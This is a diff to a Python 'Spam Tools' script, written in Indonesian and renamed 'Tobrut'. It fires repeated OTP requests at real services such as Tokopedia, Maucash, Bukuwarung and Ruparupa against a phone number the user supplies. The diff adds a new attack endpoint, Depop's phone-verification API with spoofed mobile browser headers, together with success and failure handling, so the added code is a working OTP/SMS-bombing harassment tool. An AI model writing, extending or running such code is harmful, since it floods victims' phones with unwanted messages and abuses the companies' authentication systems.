@@ -59,26 +59,26 @@ def countdown(time_sec):
         }  
         hari = hari_hari.get(keterangan_hari)
 
-        print(f"{timeformat} | {putih}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {putih}Waktu {keterangan_jam}", end='\r')
+        print(f"{timeformat} | {putih}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {hijau}Waktu {keterangan_jam}", end='\r')
         time.sleep(1)
         time_sec -= 1
     print("")
 
 def tanya(nomor):
     while True:
-        a = input(f"""{putih}Apakah Kamu ingin mengulangi Spam Tools? y/t {putih}Input Kamu: {putih}""")
+        a = input(f"""{putih}Apakah Kamu ingin mengulangi Tobrut? y/t {putih}Input Kamu: {putih}""")
         if a.lower() == "y":
             start(nomor, 1)
             break
         elif a.lower() == "t":
-            autoketik(f"{putih}Berhasil Keluar Dari Tools!")
+            autoketik(f"{putih}Berhasil Keluar Dari Tobrut!")
             sys.exit()
         else:
             print("Masukan Pilihan Dengan Benar!")
 
 def jam(nomor):
     print("""
-\033[1;93m
+\033[1;92m
      
 ▒▒▒▒▒ 2024
 ▒   ▒| 
@@ -90,9 +90,10 @@ def jam(nomor):
 ▒ T ▒|            
 ▒   ▒|
 ▒▒▒▒▒ 2019
-\033[1;93m
+\033[1;92m
 """)
     autoketik("Program Berjalan!")
+    autoketik("Tobrut lewat, Tunggu!")
     b = nomor[1:12] # Contoh nomor = 081319196666
     c = "62" + b    # Contoh nomor = 6281319196666
     rto = True 
@@ -343,17 +344,7 @@ def jam(nomor):
             )
 
             # 9
-            """ response_metroindonesia = requests.post(
-                'http://access.metroindonesia.com/Member/sendpin', data={'phoneno': nomor}
-            ) """
-
-            # 10
-            """ response_harnic = requests.post(
-                'https://harnic.id:443/login/phone_auth_OTP', data={'phone': nomor}
-            ) """
-
-            # 11
-            response_Bukuwarung_wa_500xend = requests.post(
+            response_bukuwarung_wa_500xend = requests.post(
                 "https://api-v2.bukuwarung.com/api/v2/auth/otp/send",
                 headers={
                     "Host": "api-v2.bukuwarung.com",
@@ -385,6 +376,20 @@ def jam(nomor):
                 })
             )
 
+            # 10
+            response_depop_from30 = requests.put(
+                "https://webapi.depop.com/api/auth/v1/verify/phone",
+                data=json.dumps({"phone_number":nomor,"country_code":"ID"}),
+                headers={
+                    "Host": "webapi.depop.com",
+                    "accept": "application/json, text/plain, */*",
+                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+                    "Content-Type": "application/json",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+                }
+            )
+
 
 
             if response_tokopedia.status_code == 200:
@@ -412,7 +417,7 @@ def jam(nomor):
                 autoketik(f"{merah}Gagal mengirim OTP Kredito. Status code: {response_kredito.status_code}")
             
             if response_maucash.status_code == 200:
-                autoketik(f"{putih}Sukses Mengirim OTP dari Maucash!")
+                autoketik(f"{putih}Sukses Mengirim OTP Maucash!")
                 countdown(100)
                 #time.sleep(60)
                 rto = True
@@ -451,27 +456,21 @@ def jam(nomor):
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Rupa-rupa. Status code: {response_ruparupa.status_code}")
 
-            """ if response_metroindonesia.status_code == 200:
-                autoketik(f"{putih}Sukses Mengirim OTP Metro Indonesia!")
-                countdown(120)
-                rto = True
-            else:
-                autoketik(f"{merah}Gagal mengirim OTP Metro Indonesia. Status code: {response_metroindonesia.status_code}") """
-
-            """ if response_harnic.status_code == 200:
-                autoketik(f"{putih}Sukses Mengirim OTP Hernic!")
-                countdown(120)
-                rto = True
-            else:
-                autoketik(f"{merah}Gagal mengirim OTO Hernic. Status code: {response_harnic.status_code}") """
-
-            if response_Bukuwarung_wa_500xend.status_code == 200:
+            if response_bukuwarung_wa_500xend.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Bukawarung!")
                 countdown(100)
                 #time.sleep(60)
                 rto = True
             else:
-                autoketik(f"{merah}Gagal mengirim OTP Bukawarung. Status code: {response_Bukuwarung_wa_500xend.status_code}")
+                autoketik(f"{merah}Gagal mengirim OTP Bukawarung. Status code: {response_bukuwarung_wa_500xend.status_code}")
+
+            if response_depop_from30.status_code == 200:
+                autoketik(f"{putih}Sukses Mengirim OTP Depop!")
+                countdown(100)
+                #time.sleep(60)
+                rto = True
+            else:
+                autoketik(f"{merah}Gagal mengirim OTP Depop. Status code: {response_depop_from30.status_code}")
             
         except requests.exceptions.ConnectionError:
             autoketik(f"{merah}Gagal membuat koneksi baru!")
